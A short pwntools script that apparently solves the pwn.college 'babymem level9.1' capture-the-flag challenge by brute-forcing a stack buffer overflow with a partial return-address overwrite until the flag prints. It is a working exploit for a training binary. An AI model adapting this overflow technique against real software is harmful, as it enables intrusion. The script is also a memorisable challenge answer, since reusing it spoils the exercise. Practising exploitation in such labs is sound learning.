from pwn import *

while True:
    p = process('/challenge/babymem_level9.1')

    p.recvuntil('Payload size:')
    p.sendline(b'58')

    payload =  b'a' * 24 + p8(55) + p16(0x47ea) 

    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break

